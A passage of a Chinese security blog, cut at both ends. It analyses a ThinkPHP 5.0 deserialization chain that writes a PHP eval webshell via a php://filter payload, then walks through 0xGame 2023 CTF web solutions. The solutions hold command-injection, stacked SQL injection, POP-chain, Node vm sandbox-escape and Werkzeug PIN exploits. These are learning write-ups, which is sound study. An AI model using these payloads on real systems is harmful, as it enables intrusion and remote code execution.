我们继续跟进第二个断点\n\n是对`$value`进行赋值\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702383592936-3f2e8136-b869-4562-ac0c-0e816bcffd14.png)\n\n这里有一个很长的if条件语句的判断\n\n```\nif ($this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent))\n```\n\n我们一部分一部分来看\n\n条件一：\n\n之前我们5.1版本的时候在`__toSring`这一部分的时候是触发了__call方法，那么我们在这的目标也是去寻找合适的call方法，那么最终是找到了`think\\console\\Output`我们应该让这个方法返回一个output对象 这样等我们出去之后 执行`$value->getAttr($attr)`就会触发`__call()`；额，因此这里value的值为`$this-parent`，所以我们需要赋值为一个output对象\n\n条件二：\n\n$modelRelation我们已经对它赋值了HasOne对象了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384075250-485d27df-567b-42e4-909f-c9373ac7cc21.png)\n\n我们跟进`isSelfRelation()`方法 它是Relation类的一个方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384182743-0270df5d-fc44-408e-9f9a-6def2b02dbb4.png)\n\n而OneToOne是它的子类 ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384248249-c1f53c2f-f63c-4258-a3c5-9e277eace62c.png)\n\nHasOne是OneToOne的一个子类![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384300728-5a488be0-ad20-48a0-a430-fc24575a168b.png)\n\n因此我们控制`HasOne->selfRelation`为false即可\n\n条件三：`get_class($modelRelation->getModel()) == get_class($this->parent)`\n\n之前我们说到让`$this->parent`为一个Output对象即可 因此这里条件成立的就是让`$modelRelation->getModel()`返回一个output对象\n\n我们跟进这个函数观察一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384583595-25a71b36-479a-4fa7-9850-231cb4feb500.png)\n\n那么思路就是看看哪个类使用了同名getModel函数 并且方法我们可控\n\n那么最后找到是Query类\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384728365-53145e1f-2749-4e58-b5f2-7ad47555d27e.png)\n\n因此我们这里只需要`$this->query`为Query的一个对象即可 \n\n那么三个条件均满足 然后`$value = $this->parent`我们就出来了\n\n接着进入第三个断点\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384867170-96542676-a086-45fc-a7c7-78f0cbc455e0.png)\n\n这里`$modelRelation`是HasOne对象 调用它的getBindAttr方法 其实它没有 调用的是它的父类OneToOne的方法\n\n返回一个数组`[\"a\"=>\"admin\"]`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385130534-ca593a2e-d4ec-4b2a-8262-b6f7d678259c.png)\n\n出来之后 我们对bindAttr数组做了遍历 取出了admin值 并且赋值给`$attr` 准备进入__call方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385270965-3c8c5977-cfd1-4096-8fe1-d43c5971ce20.png)\n\nvalue为Output对象 attr为admin\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385400098-cb29f0b7-7658-41ce-971d-6192d5f6fed5.png)\n\n\n\n继续跟进\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385455272-facd2168-2893-44ce-818c-5addd49162ca.png)\n\n用array_unshift函数将方法名也就是getAttr加到参数数组中 最后为`[\"getAttr\",\"admin\"]`\n\n然后用`call_user_func_array()`调用自己的block方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385660127-4ad92565-a9da-4a18-b38e-213780816b13.png)\n\n跟进该方法 调用了writeln方法 并且值为我们当作参数传入的数组内容\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385812207-c646114f-7e0f-4319-9968-573f7108e987.png)\n\n继续跟进writeln 又调用了write方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702385868106-38a09ecb-7388-41df-a310-a79fb86b0fd0.png)\n\n那么我们全局搜索看看谁调用了write函数 在Memcached类找到了合适的write方法\n\n因此让Output类中`$this->handler`为Memecached对象即可 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386253172-ce3e25a5-224c-4c7f-af89-35174a14bc81.png)\n\n这里又调用了set方法 我们继续set方法\n\n最后发现File类中调用了set方法 所以这里我们让Memcache类中的`$this->handler`为File对象即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386333208-33809789-92e0-4574-a19d-1f4c14c2760c.png)\n\n继续向下走 我们可以看到这里有直接写php🐎的语句 但是有死亡exit()我们可以利用编解码绕过 `php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php`\n\n这里就不过多赘述了 参考：https://www.cnblogs.com/meng-han/p/16849600.html\n\n然后还有`file_put_contents()` 危险函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702386596117-accfef1b-456e-4185-af8b-d5cd89c25aa6.png)\n\n`$filename`通过`getCacheKey`函数获得的 我们跟进\n\n这里的name为我们之前参数数组中两个值getAttr和admin拼接的 然后计算其md5值赋值为`$name`\n\n为`63ac11a7699c5c57d85009296440d77a`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387227854-b8616d60-99b4-4d13-928f-2bbaed760a6a.png)\n\n接着到`$this->options['path']` 这里我们是可控的 也就是文件名我们可控 设置为我们的特殊编解码paylaod\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387307842-5b351ecc-b1bb-49be-800b-f6629a6202ab.png)\n\n文件最终名为`$name` 也就是之前计算的md5值 再加上`$this->options['path']`两部分构成的\n\n为`php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php`\n\n虽然此时我们文件名可控了但是`$value`为true 也就是文件内容`$data`我们不可控 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387750421-cc16d9f2-abcd-4aae-b13b-45c0f2ea3ba7.png)\n\n继续分析这里会调用setTagItem这个函数 我们跟进观察\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387860334-4f4aa100-87e2-40ed-8cbe-64c36ed272a7.png)\n\n该函数又会调用一次set函数 那么此时`$value`的值我们是可控的 也就是传进来的`$name`也就是`$filename`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702387939980-8e0ce116-2027-4287-a7db-6b69ee7afffb.png)\n\n那么此时传入set的`$name`为`$key=tag_c4ca4238a0b923820dcc509a6f75849b`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702388521425-d31d2d3d-c5e0-4c87-8991-4cc6f1569117.png)\n\n但是这里还有一个问题 就是exit()死亡函数的绕过 我们写入文件的内容受到这个函数的影响\n\n并且内容就是我们的文件名 因此只需要我们将文件名构造为特殊的可以吞掉exit()的编码即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702388214099-8cb10a8d-65bb-4999-98b7-64f2f9e0a06d.png)\n\n所以会生成两个文件 只有第二个文件内容才是我们想要的\n\n并且第二个文件名为`\"php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php\"+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php`\n\n产出的文件名为：`a.php3b58a9545013e88c7186db11bb158c44.php`\n\n这里文件名也有讲究 我们可以看到我们的文件名应该是`aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php3b58a9545013e88c7186db11bb158c44.php\"+md5(tag_c4ca4238a0b923820dcc509a6f75849b).php`这一坨才对 \n\n最后为什么只生成了我们想要的`a.php3b58a9545013e88c7186db11bb158c44.php`\n\n我们将前面的一串base64字符整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成`a.php3b58a9545013e88c7186db11bb158c44.php`文件，从而就可以生成正常的文件名。\n\n参考：[探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/266565.html)\n\n至此分析完美撒花\n\n# 结尾\n\n不能只是一味的为了解题而去刷题不去深究真正的漏洞原因\n\n看了很多厉害师傅的博客 深深的e住了\n\n不把屎一样的东西搬出来抽象了 放在雨雀上自己看看就好了\n\n这也是为什么停了博客一个月了qwq，深思中。。。\n\n还有就是期末了 也e 要给时间复习了\n\n# 参考：\n\n[ThinkPHP5.x反序列化漏洞全复现 - Boogiepop Doesn’t Laugh](https://boogipop.com/2023/03/02/ThinkPHP5.x反序列化漏洞全复现/#五、ThinkPHP5-0-x反序列化链)\n\n[thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区](https://xz.aliyun.com/t/6619#toc-1)\n\n[探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/266565.html)\n","categories":["-漏洞复现"]},{"title":"0xgame2023 web复现学习","url":"/post/7a0dbac6.html","content":"\n0xgame师傅们出的题目质量真的很高 学习学习！\n    <!--more-->\n\n# WEEK1\n\n## [Week 1] signin\n\n找j源码就有\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696128791084-a0ea71f9-f12e-45cf-a069-46d8e6a40e9f.png)\n\n## [Week 1] hello_http\n\n经典考察http协议\n\n```java\nPOST /?query=ctf HTTP/1.1\nHost: 124.71.184.68:50012\nContent-Length: 14\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://124.71.184.68:50012\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: HarmonyOS Browser\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: ys.mihoyo.com\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nX-Forwarded-For: 127.0.0.1\nCookie: role=admin\nConnection: close\n\naction=getflag\n```\n\n## [Week 1] baby_php\n\n经典题型 注意一下这里就是要用伪协议去读 别直接包含flag那样读不出来的\n\n```java\nPOST /?a=QNKCDZO&b=240610708 HTTP/1.1\nHost: 120.27.148.152:50014\nContent-Length: 11\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://120.27.148.152:50014\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://120.27.148.152:50014/?a=QNKCDZO&b=240610708\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: name=php://filter/read=convert.base64-encode/resource=flag\nConnection: close\n\nc=1024.1%00\n```\n\n\n\n## [Week 1] ping\n\n疑似被搅屎了\n\n```java\n<?php\n\nfunction sanitize($s) {\n    $s = str_replace(';', '', $s);\n    $s = str_replace(' ', '', $s);\n    $s = str_replace('/', '', $s);\n    $s = str_replace('flag', '', $s);\n    return $s;\n}\n\nif (isset($_GET['source'])) {\n    highlight_file(__FILE__);\n    die();\n}\n\nif (!isset($_POST['ip'])) {\n    die('No IP Address');\n}\n\n$ip = $_POST['ip'];\n\n$ip = sanitize($ip);\n\nif (!preg_match('/((\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.){3}(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])/', $ip)) {\n    die('Invalid IP Address');\n}\n\nsystem('ping -c 4 '.$ip. ' 2>&1');\n\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696132566678-8a6865cd-dbef-41e2-ad6e-73f8a03baef2.png)\n\n没搅屎的payload:\n\n用base64编码绕过就行\n\n```java\nip=127.0.0.1|echo${IFS}\"Y2F0IC9mKg==\"|base64${IFS}-d|bash\n```\n\n## [Week 1] repo_leak\n\n要用这个工具才能找到git泄露https://github.com/gakki429/Git_Extract\n\ngithack拉取不到\n\n然后翻源码能找到\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696134140917-f87d509a-66bf-4a36-aa10-a94c2ff9944a.png)\t \n\n\n\n# WEEK2\n\n操你妈不知道是我这里校园网的原因 环境一直像狗屎一样恶心我\n\n文件上传一直访问不到文件 sql注入一直转圈链接失败\n\n## [Week 2] ez_upload\n\n考点:\n\n- 二次渲染\n\nhttps://github.com/hxer/imagecreatefrom-/tree/master 项目地址\n\n需要注意：\n\n- poc环境要在python2\n- 生成语句`python2 poc_png.py -p '<?php @eval($_POST[x]);?>' -o 目标照片filename test.png(好像是模板)`\n\n\n\n## [Week 2] ez_sqli\n\n考点:\n\n- 堆叠注入\n- 预处理\n- 报错注入\n\npayload：\n\n```java\n?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C646174616261736528292929;prepare/**/aaa/**/from @c;execute/**/aaa;\n?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2853454C4543542047726F75705F636F6E636174287461626C655F6E616D65292046524F4D20696E666F726D6174696F6E5F736368656D612E7461626C6573205748455245207461626C655F736368656D61203D2027637466272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;\n?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F736368656D613D276374662720616E64207461626C655F6E616D653D27666C6167272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;\n?order=id;set/**/@c=0x73656c656374206578747261637476616c756528312c636f6e63617428307837652c307837652c737562737472282873656c65637420666c61672066726f6d206374662e666c6167292c312c33302929293b;prepare/**/aaa/**/from @c;execute/**/aaa;\n```\n\n需要注意的几个点是:\n\n- `0x字符串`是预处理语句的字符转16进制\n- 最后报错注入获得flag的时候要利用substr函数截取flag 不然显示不全\n- 语句间虽然没有ban空格但是空格会被tun 还是给替换了。。 反正`/**/`绕一下\n\n## [Week 2] ez_unserialize\n\n```java\n<?php\n\nshow_source(__FILE__);\n\nclass Cache {\n    public $key;\n    public $value;\n    public $expired;\n    public $helper;\n\n    public function __construct($key, $value, $helper) {\n        $this->key = $key;\n        $this->value = $value;\n        $this->helper = $helper;\n\n        $this->expired = False;\n    }\n\n    public function __wakeup() {\n        $this->expired = False;\n    }\n\n    public function expired() {\n        if ($this->expired) {\n            $this->helper->clean($this->key);\n            return True;\n        } else {\n            return False;\n        }\n    }\n}\n\nclass Storage {\n    public $store;\n\n    public function __construct() {\n        $this->store = array();\n    }\n    \n    public function __set($name, $value) {\n        if (!$this->store) {\n            $this->store = array();\n        }\n\n        if (!$value->expired()) {\n            $this->store[$name] = $value;\n        }\n    }\n\n    public function __get($name) {\n        return $this->data[$name];\n    }\n}\n\nclass Helper {\n    public $funcs;\n\n    public function __construct($funcs) {\n        $this->funcs = $funcs;\n    }\n\n    public function __call($name, $args) {\n        $this->funcs[$name](...$args);\n    }\n}\n\nclass DataObject {\n    public $storage;\n    public $data;\n\n    public function __destruct() {\n        foreach ($this->data as $key => $value) {\n            $this->storage->$key = $value;\n        }\n    }\n}\n\nif (isset($_GET['u'])) {\n    unserialize($_GET['u']);\n}\n?>\n```\n\n一开始对这里有点陌生 自己举个例子理解一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696860418282-2b207032-929a-4a0c-b3e2-98bf59c8ba6b.png)\n\n如果这是`$this->data`是个数组 那么就很好理解了 记录一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696860466228-d3470799-1f0a-41bb-bf4b-516a1c4f8704.png)\n\n然后是pop链构造\n\n```java\n<?php\n\nclass Cache {\n    public $key;\n    public $value;\n    public $expired;\n    public $helper;\n}\nclass Storage {\n    public $store;\n}\nclass Helper {\n    public $funcs;\n}\nclass DataObject {\n    public $storage;\n    public $data;\n}\n$a = new DataObject();\n$a->storage = new Storage();\n$b = new Cache();\n$a->data = [\"Z1d10t\"=>$b];\n$b->expired = 1;\n$b->helper = new Helper();\n$b->helper->funcs = [\"clean\"=>\"system\"];\n$b->key = 'env';\necho serialize($a);\n?>\n```\n\n注意：\n\n- 这里赋值数组时候不能用`array(\"1\"=>\"1\");` 要用`[\"1\"=>\"1\"] ` 实测第一种会断开链子\n- expired函数调用在这里 很微妙 容易忽略![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696862014638-0334abee-df42-4565-9ab4-ad31e89c3f51.png)\n\n## [WEEK2]ez_sandbox\n\n一道原型链污染+vm沙盒逃逸的题目\n\n源码如下：\n\n```go\nconst crypto = require('crypto')\nconst vm = require('vm');\n\nconst express = require('express')\nconst session = require('express-session')\nconst bodyParser = require('body-parser')\n\nvar app = express()\n\napp.use(bodyParser.json())\napp.use(session({\n    secret: crypto.randomBytes(64).toString('hex'),\n    resave: false,\n    saveUninitialized: true\n}))\n\nvar users = {}\nvar admins = {}\n\nfunction merge(target, source) { //污染函数\n    for (let key in source) {\n        if (key === '__proto__') {\n            continue\n        }\n        if (key in source && key in target) {\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n    return target\n}\n\nfunction clone(source) { //调用污染函数点\n    return merge({}, source)\n}\n\nfunction waf(code) {\n    let blacklist = ['constructor', 'mainModule', 'require', 'child_process', 'process', 'exec', 'execSync', 'execFile', 'execFileSync', 'spawn', 'spawnSync', 'fork']\n    for (let v of blacklist) {\n        if (code.includes(v)) {\n            throw new Error(v + ' is banned')\n        }\n    }\n}\n\nfunction requireLogin(req, res, next) {\n    if (!req.session.user) {\n        res.redirect('/login')\n    } else {\n        next()\n    }\n}\n\napp.use(function(req, res, next) {\n    for (let key in Object.prototype) {\n        delete Object.prototype[key]\n    }\n    next()\n})\n\napp.get('/', requireLogin, function(req, res) {\n    res.sendFile(__dirname + '/public/index.html')\n})\n\napp.get('/login', function(req, res) {\n    res.sendFile(__dirname + '/public/login.html')\n})\n\napp.get('/register', function(req, res) {\n    res.sendFile(__dirname + '/public/register.html')\n})\n\napp.post('/login', function(req, res) {\n    let { username, password } = clone(req.body)\n\n    if (username in users && password === users[username]) {\n        req.session.user = username\n\n        if (username in admins) {\n            req.session.role = 'admin'\n        } else {\n            req.session.role = 'guest'\n        }\n\n        res.send({\n            'message': 'login success'\n        })\n    } else {\n        res.send({\n            'message': 'login failed'\n        })\n    }\n})\n\napp.post('/register', function(req, res) {\n    let { username, password } = clone(req.body)\n\n    if (username in users) {\n        res.send({\n            'message': 'register failed'\n        })\n    } else {\n        users[username] = password\n        res.send({\n            'message': 'register success'\n        })\n    }\n})\n\napp.get('/profile', requireLogin, function(req, res) {\n    res.send({\n        'user': req.session.user,\n        'role': req.session.role\n    })\n})\n\napp.post('/sandbox', requireLogin, function(req, res) {\n    if (req.session.role === 'admin') {\n        let code = req.body.code\n        let sandbox = Object.create(null)\n        let context = vm.createContext(sandbox)\n        \n        try {\n            waf(code)\n            let result = vm.runInContext(code, context)\n            res.send({\n                'result': result\n            })\n        } catch (e) {\n            res.send({\n                'result': e.message\n            })\n        }\n    } else {\n        res.send({\n            'result': 'Your role is not admin, so you can not run any code'\n        })\n    }\n})\n\napp.get('/logout', requireLogin, function(req, res) {\n    req.session.destroy()\n    res.redirect('/login')\n})\n\napp.listen(3000, function() {\n    console.log('server start listening on :3000')\n})\n```\n\n首先需要原型链污染让我们以admin身份登录\n\n这里禁用了__proto__\n\n所以这里可以通过`constructor.prototype`来bypass\n\n因为`__proto__=constructor.prototype`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697265247445-5346a095-844e-4832-8980-ad26201c773d.png)\n\n之后就是vm沙盒逃逸 参考[NodeJS VM和VM2沙箱逃逸 - 先知社区](https://xz.aliyun.com/t/11859#toc-4)\n\n因为this为null\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697288378181-1f6cf69e-9bf6-4984-b92f-951579eee84d.png)\n\n所以我们要用到一个函数中的内置对象的属性`arguments.callee.caller`，它可以返回函数的调用者。\n\n我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的`arguments.callee.caller`就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了\n\n除此之外这道题沙箱没有返回值 我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出\n\n在沙箱内可以通过 throw 来抛出一个对象 这个对象会被沙箱外的 catch 语句捕获 然后会访问它的 message 属性 (即 e.message)\n通过 JavaScript 的 Proxy 类或对象的 __defineGetter__ 方法来设置一个 getter 使得在沙箱外访问 e 的 message 属性 (即 e.message) 时能够调用某个函数\n\n除此之外还要绕一下waf\n\n这里提供两种paylaod \n\nbypass姿势参考：[nodejs中代码执行绕过的一些技巧-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/237032#h3-3)[奇安信攻防社区-NodeJS中的RCE的利用和绕过](https://forum.butian.net/share/1631)\n\n```javascript\n#第一种利用模板字符串\n  throw new Proxy({}, {\n    get: function(){\n      const cc = arguments.callee.caller;\n      const p = (cc[`${`constructo`}r`][`${`constructo`}r`](`return ${`proces`}s`))();\n      return p[`${`mainModul`}e`][`${`requir`}e`]('child_pr'+'ocess')[`${`exe`}cSync`}`]('id').toString();\n}\n})\n#第二种利用字符串拼接\nthrow new Proxy({}, {\n        get: function(){\n            const cc = arguments.callee.caller;\n            const p = (cc['const'+'ructor']['cons'+'tructor']('return pr'+'ocess'))();\n            return p['mai'+'nModule']['re'+'quire']('child_p'+'rocess')['exe'+'cSync']('cat /f*').toString();\n        }\n    })\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697288660433-2c0dc5cd-e4fe-41c6-abf5-097466e5fde7.png)\n\n\n\n# WEEK3\n\n## [Week 3] notebook\n\n考点：\n\n- pickle反序列化\n\n源码如下：\n\n```javascript\nfrom flask import Flask, request, render_template, session\nimport pickle\nimport uuid\nimport os\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = os.urandom(2).hex()\n\nclass Note(object):\n    def __init__(self, name, content):\n        self._name = name\n        self._content = content\n\n    @property\n    def name(self):\n        return self._name\n    \n    @property\n    def content(self):\n        return self._content\n\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n\n@app.route('/<path:note_id>', methods=['GET'])\ndef view_note(note_id):\n    notes = session.get('notes')\n    if not notes:\n        return render_template('note.html', msg='You have no notes')\n    \n    note_raw = notes.get(note_id)\n    if not note_raw:\n        return render_template('note.html', msg='This note does not exist')\n    \n    note = pickle.loads(note_raw)\n    return render_template('note.html', note_id=note_id, note_name=note.name, note_content=note.content)\n\n\n@app.route('/add_note', methods=['POST'])\ndef add_note():\n    note_name = request.form.get('note_name')\n    note_content = request.form.get('note_content')\n\n    if note_name == '' or note_content == '':\n        return render_template('index.html', status='add_failed', msg='note name or content is empty')\n    \n    note_id = str(uuid.uuid4())\n    note = Note(note_name, note_content)\n\n    if not session.get('notes'):\n        session['notes'] = {}\n    \n    notes = session['notes']\n    notes[note_id] = pickle.dumps(note)\n    session['notes'] = notes\n    return render_template('index.html', status='add_success', note_id=note_id)\n\n\n@app.route('/delete_note', methods=['POST'])\ndef delete_note():\n    note_id = request.form.get('note_id')\n    if not note_id:\n        return render_template('index.html')\n    \n    notes = session.get('notes')\n    if not notes:\n        return render_template('index.html', status='delete_failed', msg='You have no notes')\n    \n    if not notes.get(note_id):\n        return render_template('index.html', status='delete_failed', msg='This note does not exist')\n    \n    del notes[note_id]\n    session['notes'] = notes\n    return render_template('index.html', status='delete_success')\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000, debug=False)\n```\n\n大致审计一下 \n\n大致思路为`/add_note`下会将我们提交的数据进行pickle序列化 内容保存在session中\n\n然后在`/<path:note_id>`进行pickle反序列化\n\n那么如果我们可以控制session 将里面的正常序列化数据改为恶意数据 那么就可以实现RCE了\n\n遇到的一些问题：\n\n1. 首先是flask_unsign脚本爆破sercet的问题 这个脚本需要最原始的session来进行爆破 如果是提交了任何参数的session都会爆不出secret\n2. 因为我们opcode加上我们的payload一般还有一些特殊字符比如`/ &`那么进行伪造session的时候就会涉及到转义的问题 转义头都大了 这里Aecous师傅提供了一种好的方法 可以现在自己本地搭建好题目 然后修改相关生成的session的参数 让题目自己去处理session转义问题 然后直接本地获取含恶意payload的session然后再提交给题目 （记得本地secret_key也要保持和题目一致 ）![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697614101618-a7dbef85-9523-4e2f-a60a-72a72819d305.png)\n3. 关于R指令的问题这个题目好像R指令稍稍有点问题导致没法弹回payload 可以试着用其他指令比如我用的是i指令  （回来补坑了 因为用pickle.dumps()  来生成 payload, 不同操作系统⽣成的 pickle 序列化数据是有区别的   因此我们windows生成的payload在linux用不了 参考：[pickle反序列化初探 - 先知社区](https://xz.aliyun.com/t/7436)）\n\n\n\n\n\n\n\n## [Week 3] rss_parser\n\n源码如下：\n\n```javascript\nfrom flask import Flask, render_template, request, redirect\nfrom urllib.parse import unquote\nfrom lxml import etree\nfrom io import BytesIO\nimport requests\nimport re\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'GET':\n        return render_template('index.html')\n    else:\n        feed_url = request.form['url']\n        if not re.match(r'^(http|https)://', feed_url):\n            return redirect('/')\n\n        content = requests.get(feed_url).content\n        tree = etree.parse(BytesIO(content), etree.XMLParser(resolve_entities=True))\n\n        result = {}\n\n        rss_title = tree.find('/channel/title').text\n        rss_link = tree.find('/channel/link').text\n        rss_posts = tree.findall('/channel/item')\n\n        result['title'] = rss_title\n        result['link'] = rss_link\n        result['posts'] = []\n\n        if len(rss_posts) >= 10:\n            rss_posts = rss_posts[:10]\n\n        for post in rss_posts:\n            post_title = post.find('./title').text\n            post_link = post.find('./link').text\n            result['posts'].append({'title': post_title, 'link': unquote(post_link)})\n \n        return render_template('index.html', feed_url=feed_url, result=result)\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000, debug=True)\n```\n\n简单审计\n\n大致思路为它会通过http协议去访问一个网站 然后将其访问到的内容通过xml解析出来 然后正则匹配相关的内容 然后帮我们渲染出来\n\n`resolve_entities=True`重点关注这个 如果这个选项被设置为了true 那么它就会帮我们解析xml实体\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598725169-4234b27f-2cd7-4f45-9a3d-a74ee5c59a88.png)\n\n来自：[python_code_audit/XXE.md at master · MisakiKata/python_code_audit](https://github.com/MisakiKata/python_code_audit/blob/master/XXE.md)\n\n除此之外`debug=True`这意味着 如果我们能计算出pin值 我们就可以通过`/console`直接进行rce\n\n所以我们的思路就是:\n\n1. 用vps起一个python http服务 然后把有恶意内容的xml文件放其目录中\n2. 访问 读取相关计算pin码的文件\n3. rce\n\nxml文件内容如下：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598961969-50ab931f-47fc-41ad-87bd-af42dac22163.png)\n\n起http服务\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697598998390-a5a202e2-73c9-4947-bc4d-21ebe510f301.png)\n\n读取到相关配置文件内容\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697599022319-c2bbeff1-534b-4a27-b482-759dbb2f87fb.png)\n\n然后这道题目其实`/proc/self/cgroup`是空的 \n\n只需要读取`/etc/machine-id`值就可以计算machine-id了\n\n然后用户是app 路径报错得到\n\n计算pin码\n\n```javascript\nimport hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n    'app'  # /etc/passwd\n    'flask.app',  # 默认值\n    'Flask',  # 默认值\n    '/usr/local/lib/python3.9/site-packages/flask/app.py'  # 报错得到\n]\n\nprivate_bits = [\n    '2485378744322',  # /sys/class/net/eth0/address 十进制\n    '96cec10d3d9307792745ec3b85c89620'\n    # 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup\n]\n\n# 下面为源码里面抄的，不需要修改\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                            for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = 